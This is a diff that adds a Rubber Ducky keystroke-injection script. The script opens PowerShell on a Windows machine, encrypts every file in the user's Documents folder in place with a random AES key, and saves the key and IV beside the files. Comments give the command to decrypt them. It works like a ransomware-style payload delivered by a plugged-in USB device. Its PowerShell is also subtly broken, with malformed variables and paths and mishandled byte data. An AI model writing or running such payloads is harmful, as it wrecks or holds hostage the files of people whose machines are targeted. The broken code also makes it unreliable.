@@ -1,0 +1,16 @@
+REM Rubber Ducky script to encrypt and decrypt files on a computer
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c powershell -c "$pass = read-host 'Enter password:' -AsSecureString; $key = New-Object Byte[] 16; (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($key); $iv = New-Object Byte[] 16; (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv); dir -Recurse C:\Users%USERNAME%\Documents\ | % { $path = $.FullName; if ($.PSIsContainer -ne $true) { $content = Get-Content $path; $encrypted = [System.Security.Cryptography.RijndaelManaged]::new().CreateEncryptor($key,$iv).TransformFinalBlock($content,0,$content.Length); Set-Content -Path $path -Value $encrypted; }}; Set-Content -Path C:\Users%USERNAME%\Documents\key.txt -Value ($key | ConvertTo-SecureString -AsPlainText -Force); Set-Content -Path C:\Users%USERNAME%\Documents\iv.txt -Value ($iv | ConvertTo-SecureString -AsPlainText -Force);"
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
+
+REM Now prompt the user to enter the password to decrypt the files
+REM This can be triggered with a separate rubber ducky script
+REM Or by typing the command in a command prompt
+REM cmd /c powershell -c "$key = Get-Content C:\Users%USERNAME%\Documents\key.txt | ConvertTo-SecureString; $iv = Get-Content C:\Users%USERNAME%\Documents\iv.txt | ConvertTo-SecureString; dir -Recurse C:\Users%USERNAME%\Documents\ | % { $path = $.FullName; if ($.PSIsContainer -ne $true) { $encrypted = Get-Content $path; $content = [System.Security.Cryptography.RijndaelManaged]::new().CreateDecryptor($key,$iv).TransformFinalBlock($encrypted,0,$encrypted.Length); Set-Content -Path $path -Value $content; }};"
+REM The password prompt can also be triggered with a shortcut or a scheduled task
